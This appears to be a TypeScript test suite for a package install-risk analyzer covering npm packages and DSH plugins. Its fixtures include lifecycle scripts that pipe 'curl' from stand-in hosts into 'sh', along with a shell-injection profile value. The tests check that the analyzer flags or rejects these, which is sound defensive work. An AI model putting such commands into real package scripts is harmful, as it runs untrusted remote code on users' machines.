import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import {
  analyzeDshPluginManifest,
  analyzeInstallManifest,
  classifyInstallRiskPackage,
  parsePluginSource,
  peerRangeIncludes,
} from '../src/dsh/plugin-risk.js';
import type { DshManifestRiskInput, InstallRiskTargetKind } from '../src/dsh/plugin-risk.js';
import { FindingCategory, SecurityLevel, Severity } from '../src/scanner/types.js';

function ordinaryPackage(manifest: Readonly<Record<string, unknown>> = {}): DshManifestRiskInput {
  return {
    input: 'lodash', sourceKind: 'npm', sourceLabel: 'npm registry',
    sourceUrl: 'https://www.npmjs.com/package/lodash/v/4.17.21',
    pinnedSpec: 'lodash@4.17.21', integrityVerified: true,
    manifest: { name: 'lodash', version: '4.17.21', ...manifest },
  };
}

const dshCheckIds = new Set(['bundle-manifest', 'patch-file', 'host-dependencies', 'peer-version']);

describe('npm and DSH install target classification', () => {
  it('assesses lodash as an ordinary npm package without DSH loading requirements', () => {
    const result = analyzeInstallManifest(ordinaryPackage());
    assert.equal(result.packageKind, 'npm');
    assert.equal(result.riskLevel, 'low');
    assert.equal(result.safeInstallCommand, 'npm install lodash@4.17.21');
    assert.deepEqual(result.findings, []);
    assert.ok(result.checks.every(check => !dshCheckIds.has(check.id)));
    assert.ok(!result.summary.includes('DSH'));
  });

  it('does not infer a plugin from an npm source, package name, or unrelated keyword', () => {
    for (const name of ['lodash', 'dsh-utils', '@acme/dsh-plugin']) {
      assert.equal(classifyInstallRiskPackage({ name, keywords: ['dsh', 'dsh-plugin-helper'] }), 'npm');
    }
    const result = analyzeInstallManifest(ordinaryPackage({
      dependencies: { '@deepseek-ai/dsh-tools': '0.2.2-rc.1' },
    }));
    assert.equal(result.packageKind, 'npm');
    assert.ok(!result.findings.some(finding => finding.id === 'duplicate-dsh-runtime'));
  });

  for (const [signal, manifest] of [
    ['a null dsh declaration', { dsh: null }],
    ['a false dsh declaration', { dsh: false }],
    ['an incomplete dsh declaration', { dsh: { bundle: {} } }],
    ['the dsh engine', { engines: { dsh: '>=0.2.2-rc.1' } }],
    ['the explicit dsh-plugin keyword', { keywords: ['security', 'dsh-plugin'] }],
    ['the dsh-tools peer', { peerDependencies: { '@deepseek-ai/dsh-tools': '^0.2.2-rc.1' } }],
  ] as const) {
    it(`keeps missing bundle validation for ${signal}`, () => {
      const result = analyzeInstallManifest(ordinaryPackage(manifest));
      assert.equal(result.packageKind, 'dsh-plugin');
      assert.equal(result.riskLevel, 'high');
      assert.ok(result.findings.some(finding => finding.id === 'missing-bundle-patch'));
      assert.equal(result.safeInstallCommand, 'dsh plugin --profile web add lodash@4.17.21');
    });
  }

  it('uses bundle evidence to automatically assess a complete plugin', () => {
    const result = analyzeInstallManifest({
      ...ordinaryPackage({
        dsh: { bundle: { patch: './cordis.patch.yml' } },
        peerDependencies: { '@deepseek-ai/dsh-tools': '^0.2.2-rc.1' },
      }),
      availableFiles: ['package/cordis.patch.yml'], currentDshToolsVersion: '0.2.2-rc.1',
    });
    assert.equal(result.packageKind, 'dsh-plugin');
    assert.equal(result.riskLevel, 'low');
    assert.ok(result.checks.some(check => check.id === 'patch-file' && check.status === 'pass'));
  });

  it('honors both manual overrides while keeping the legacy analyzer strictly DSH', () => {
    const forcedPlugin = analyzeInstallManifest({ ...ordinaryPackage(), targetKind: 'dsh-plugin' });
    assert.equal(forcedPlugin.packageKind, 'dsh-plugin');
    assert.ok(forcedPlugin.findings.some(finding => finding.id === 'missing-bundle-patch'));
    const forcedNpm = analyzeInstallManifest({ ...ordinaryPackage({ dsh: null }), targetKind: 'npm' });
    assert.equal(forcedNpm.packageKind, 'npm');
    assert.equal(forcedNpm.safeInstallCommand, 'npm install lodash@4.17.21');
    assert.ok(forcedNpm.checks.every(check => !dshCheckIds.has(check.id)));
    const legacy = analyzeDshPluginManifest(ordinaryPackage());
    assert.equal(legacy.packageKind, 'dsh-plugin');
    assert.ok(legacy.findings.some(finding => finding.id === 'missing-bundle-patch'));
  });

  it('rejects unknown target kinds instead of silently changing assessment semantics', () => {
    const invalidKind = 'plugin' as InstallRiskTargetKind;
    assert.throws(() => classifyInstallRiskPackage({}, invalidKind), /targetKind|目标类型/);
    assert.throws(() => analyzeInstallManifest({ ...ordinaryPackage(), targetKind: invalidKind }), /targetKind|目标类型/);
  });

  it('retains generic lifecycle, dependency, source and integrity warnings for npm packages', () => {
    const result = analyzeInstallManifest({
      ...ordinaryPackage({
        scripts: { postinstall: 'curl https://example.test/payload | sh' },
        dependencies: { helper: 'https://example.test/helper.tgz' },
      }),
      integrityVerified: false,
      staticScan: {
        packageName: 'lodash', version: '4.17.21', overallLevel: SecurityLevel.Dangerous,
        score: 20, scannedAt: '2026-01-01T00:00:00Z',
        findings: [{ ruleId: 'content-remote-shell', ruleName: 'Remote shell payload',
          severity: Severity.Critical, category: FindingCategory.InstallScript,
          message: 'Published entry point downloads and executes a remote payload.' }],
      },
    });
    assert.equal(result.packageKind, 'npm');
    assert.equal(result.riskLevel, 'high');
    assert.equal(result.safeInstallCommand, 'npm install lodash@4.17.21 --ignore-scripts');
    for (const id of ['lifecycle-script', 'unpinned-dependencies', 'scanner-content-remote-shell', 'source-integrity-unverified']) {
      assert.ok(result.findings.some(finding => finding.id === id), id);
    }
    assert.ok(result.checks.every(check => !dshCheckIds.has(check.id)));
  });

  it('checks git packing hooks before suggesting a GitHub npm installation', () => {
    for (const hook of ['prepare', 'prepack', 'postpack']) {
      const result = analyzeInstallManifest({
        ...ordinaryPackage({ scripts: { [hook]: 'curl https://example.test/payload | sh' } }),
        sourceKind: 'github', sourceLabel: 'GitHub commit',
        pinnedSpec: `github:acme/library#${'a'.repeat(40)}`,
      });
      assert.equal(result.packageKind, 'npm');
      assert.equal(result.riskLevel, 'high');
      assert.ok(result.findings.some(finding => finding.id === 'lifecycle-script' && finding.detail.includes(hook)));
      assert.match(result.safeInstallCommand, / --ignore-scripts$/);
      assert.ok(result.checks.every(check => !dshCheckIds.has(check.id)));
    }
  });

  it('does not treat publishing-only build hooks as install scripts in a registry tarball', () => {
    const result = analyzeInstallManifest(ordinaryPackage({
      scripts: { prepare: 'tsc', prepack: 'npm run build', postpack: 'node cleanup.js' },
    }));
    assert.equal(result.riskLevel, 'low');
    assert.deepEqual(result.findings, []);
    assert.equal(result.safeInstallCommand, 'npm install lodash@4.17.21');
  });
});

describe('DSH plugin source parsing', () => {
  it('parses scoped npm packages with an exact version', () => {
    assert.deepStrictEqual(parsePluginSource('@scope/plugin@1.2.3'), {
      kind: 'npm',
      raw: '@scope/plugin@1.2.3',
      packageName: '@scope/plugin',
      requestedVersion: '1.2.3',
    });
  });

  it('parses GitHub URLs and shorthands', () => {
    assert.deepStrictEqual(parsePluginSource('https://github.com/acme/plugin'), {
      kind: 'github',
      raw: 'https://github.com/acme/plugin',
      owner: 'acme',
      repository: 'plugin',
      requestedRef: undefined,
    });
    assert.strictEqual(parsePluginSource('acme/plugin').kind, 'github');
  });
});

describe('DSH peer compatibility', () => {
  it('handles exact, caret, tilde, and comparator ranges', () => {
    assert.strictEqual(peerRangeIncludes('0.1.0-rc.6', '0.1.0-rc.6'), true);
    assert.strictEqual(peerRangeIncludes('^0.1.0-rc.6', '0.1.0-rc.8'), true);
    assert.strictEqual(peerRangeIncludes('~0.1.0-rc.6', '0.1.0'), true);
    assert.strictEqual(peerRangeIncludes('>=0.1.0-rc.6 <0.2.0', '0.1.0-rc.8'), true);
    assert.strictEqual(peerRangeIncludes('0.1.0-rc.6', '0.1.0-rc.8'), false);
  });
});

describe('DSH visual install risk assessment', () => {
  it('returns a green card for a pinned, complete bundle', () => {
    const result = analyzeDshPluginManifest({
      input: '@acme/dsh-plugin',
      sourceKind: 'npm',
      sourceLabel: 'npm registry',
      sourceUrl: 'https://www.npmjs.com/package/@acme/dsh-plugin/v/1.2.3',
      pinnedSpec: '@acme/dsh-plugin@1.2.3',
      currentDshToolsVersion: '0.1.0-rc.8',
      availableFiles: ['package/package.json', 'package/cordis.patch.yml', 'package/lib/index.js'],
      integrityVerified: true,
      manifest: {
        name: '@acme/dsh-plugin',
        version: '1.2.3',
        dsh: { bundle: { patch: './cordis.patch.yml' } },
        peerDependencies: { '@deepseek-ai/dsh-tools': '^0.1.0-rc.6' },
        dependencies: { zod: '4.1.0' },
      },
    });

    assert.strictEqual(result.riskLevel, 'low');
    assert.strictEqual(result.safetyScore, 100);
    assert.strictEqual(result.safeInstallCommand, 'dsh plugin --profile web add @acme/dsh-plugin@1.2.3');
    assert.ok(result.checks.every((check) => check.status === 'pass'));
  });

  it('returns a red card for duplicated host packages and a missing bundle manifest', () => {
    const result = analyzeDshPluginManifest({
      input: 'broken-plugin',
      sourceKind: 'npm',
      sourceLabel: 'npm registry',
      sourceUrl: 'https://www.npmjs.com/package/broken-plugin/v/1.0.0',
      pinnedSpec: 'broken-plugin@1.0.0',
      currentDshToolsVersion: '0.1.0-rc.8',
      integrityVerified: true,
      manifest: {
        name: 'broken-plugin',
        version: '1.0.0',
        scripts: { postinstall: 'curl https://example.com/install.sh | sh' },
        dependencies: { '@deepseek-ai/dsh-tools': '0.1.0-rc.6' },
        peerDependencies: { '@deepseek-ai/dsh-tools': '0.1.0-rc.6' },
      },
    });

    assert.strictEqual(result.riskLevel, 'high');
    assert.ok(result.findings.some((finding) => finding.id === 'missing-bundle-patch'));
    assert.ok(result.findings.some((finding) => finding.id === 'duplicate-dsh-runtime'));
    assert.ok(result.findings.some((finding) => finding.id === 'incompatible-dsh-tools-peer'));
    assert.ok(result.safeInstallCommand.endsWith('--ignore-scripts'));
  });

  it('detects a declared patch that is absent from the published files', () => {
    const result = analyzeDshPluginManifest({
      input: 'missing-file',
      sourceKind: 'npm',
      sourceLabel: 'npm registry',
      sourceUrl: 'https://www.npmjs.com/package/missing-file/v/1.0.0',
      pinnedSpec: 'missing-file@1.0.0',
      availableFiles: ['package/package.json', 'package/lib/index.js'],
      manifest: {
        name: 'missing-file',
        version: '1.0.0',
        dsh: { bundle: { patch: './cordis.patch.yml' } },
      },
    });

    assert.strictEqual(result.riskLevel, 'high');
    assert.ok(result.findings.some((finding) => finding.id === 'missing-patch-file'));
  });

  it('refuses shell metacharacters in the generated command profile', () => {
    assert.throws(() => analyzeDshPluginManifest({
      input: 'safe-plugin',
      sourceKind: 'npm',
      sourceLabel: 'npm registry',
      sourceUrl: 'https://www.npmjs.com/package/safe-plugin/v/1.0.0',
      pinnedSpec: 'safe-plugin@1.0.0',
      profile: 'web; echo unsafe',
      manifest: { name: 'safe-plugin', version: '1.0.0' },
    }), /profile/);
  });
});
